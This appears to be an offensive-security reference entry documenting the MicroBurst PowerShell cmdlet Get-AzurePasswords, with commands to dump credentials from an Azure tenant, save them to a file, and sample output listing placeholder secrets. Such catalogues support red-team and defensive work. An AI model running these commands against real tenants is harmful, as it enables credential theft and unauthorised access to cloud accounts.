---
type: command
executor: powershell
data: Get-AzurePasswords
output: null
platforms:
  - Azure
  - Windows
tags:
  - azure
  - credential-dump
verified: true
validated: true
---

# powershell-get-azure-passwords

## Command

```powershell
Get-AzurePasswords
```

## Description

This Microburst cmdlet retrieves passwords from Azure AD, App Registrations, and other services in the authenticated tenant. It targets insecurely stored credentials and is used for credential access in Azure environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Runs with default authentication context | No |

## Examples

### Basic Usage

```powershell
Get-AzurePasswords
```

### Pipe to File

```powershell
Get-AzurePasswords | Out-File azure_passwords.txt
```

## Expected Output

Name                Password          Type
----                --------          ----
App1                secret123         ClientSecret
User1               pass456           UserPassword

A table of discovered credentials; empty if none found or insufficient permissions.

## Related

- [[procedures/Retrieve-Azure-Passwords-Using-Microburst]]
- [[tools/Microburst]]
